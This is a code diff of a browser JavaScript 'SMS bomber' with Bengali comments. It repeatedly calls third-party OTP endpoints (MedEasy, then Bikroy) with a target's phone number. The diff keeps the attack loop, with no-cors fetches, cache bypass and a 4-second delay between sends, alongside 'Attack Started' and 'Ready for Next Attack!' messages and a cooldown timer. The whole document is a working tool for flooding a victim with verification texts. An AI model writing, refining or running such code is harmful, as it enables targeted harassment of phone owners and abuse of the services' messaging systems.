@@ -1,6 +1,6 @@
-let isCooldown = false; 
+let isCooldown = false;
 
-// পেজ লোড হওয়ার সময় আগের টাইমার চেক করবে
+// পেজ লোড হওয়ার সময় চেক করবে কোনো আগের টাইমার বাকি আছে কি না
 window.onload = function() {
     const savedCooldownTime = localStorage.getItem('cooldownEndTime');
     if (savedCooldownTime) {
@@ -35,26 +35,15 @@ async function startProcess() {
 
     display.innerText = "Attack Started...";
     
-    // আপনার কনফার্ম করা ১ ও ২ নম্বর এপিআই
     const apiList = [
-        `https://api.medeasy.health/api/send-otp/+88${target}/`,
+        `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${target}`
     ];
 
     for (let i = 1; i <= count; i++) {
         try { 
-            // ১ নম্বরটি আগে পাঠানোর জন্য লজিক (MedEasy)
             let currentApi = apiList[(i - 1) % apiList.length];
-
-            // রিকোয়েস্ট পাঠানোর সময় 'no-cache' নিশ্চিত করা হয়েছে যাতে সার্ভার বুঝতে পারে এটি নতুন রিকোয়েস্ট
-            await fetch(currentApi, { 
-                method: 'GET', 
-                mode: 'no-cors',
-                cache: 'reload' // ব্রাউজার ক্যাশ ব্যবহার না করে সরাসরি সার্ভার থেকে আনবে
-            }); 
-
+            await fetch(currentApi, { method: 'GET', mode: 'no-cors', cache: 'no-store' }); 
             display.innerText = "Sent: " + i;
-            
-            // ৪ সেকেন্ডের নিরাপদ বিরতি যাতে MedEasy সার্ভার রিকোয়েস্টটি প্রসেস করতে পারে
             await new Promise(res => setTimeout(res, 4000));
         } catch (e) {
             console.log("Error skipped...");
@@ -78,13 +67,13 @@ function activateCooldown(seconds) {
         if (timeLeft <= 0) {
             clearInterval(timer);
             isCooldown = false;
-            localStorage.removeItem('cooldownEndTime');
+            localStorage.removeItem('cooldownEndTime'); // সময় শেষ হলে ডিলিট করে দিবে
             document.getElementById('display').innerText = "Ready for Next Attack!";
         }
     }, 1000);
 }
 
-// Matrix Background Animation (design remains same)
+// Matrix Background Animation
 const canvas = document.getElementById('matrix');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth;
